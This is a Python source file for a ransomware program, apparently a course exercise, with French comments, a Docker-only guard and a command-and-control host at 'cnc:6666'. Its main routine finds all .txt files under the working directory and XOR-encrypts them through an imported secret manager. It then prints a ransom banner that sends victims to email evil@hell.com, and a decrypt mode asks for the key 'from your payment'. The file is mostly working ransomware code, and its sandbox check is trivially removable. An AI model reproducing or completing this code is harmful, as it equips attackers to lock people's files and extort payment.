import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        """
        Renvoie la liste des fichiers avec l'extension stipulée en paramètre 'filter'

        Args:
            filter (str): extension de fichier de la forme ".xx"

        Returns:
            list: liste des fichiers avec l'extension 'filter'
        """
        # Définition du chemin utilisé
        dir_path = Path('./')
        # Initialisation de la liste retournée
        res = []
        # Boucle for sur tout les fichiers trouvés avec l'extension donnée en paramètre
        for file in dir_path.rglob(filter):
            # Ajout dans la liste final de chaque fichier convertis en string
            res.append(str(file))
        return res

    def encrypt(self):
        """
        Lancement du chiffrage des données de l'utilisateur
        """
        # main function for encrypting (see PDF)
        # Récupération des fichiers à chiffrer
        files = self.get_files("*.txt")

        # Création de l'instance de SecretManager qui va initialisé le chiffrage
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.setup()
        secret_manager.xorfiles(files)
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))

    def decrypt(self):
        """
        Lancement du déchiffrage des données de l'utilisateur
        """
        # main function for decrypting (see PDF)
        # Instance du SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.load()
        # Récupération des fichiers à déchiffrer
        to_free = self.get_files("*.txt")
        while True:
            try:
                # Demande et vérification de la clé donné par la victime
                candidate_key = input("Please enter the key you obtain from your payment")
                secret_manager.set_key(candidate_key)
                secret_manager.xorfiles(to_free)
                secret_manager.clean()
                print("Good key, yes file")
                break
            except ValueError as e:
                print("Error",{e},"Wrong key, no file")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()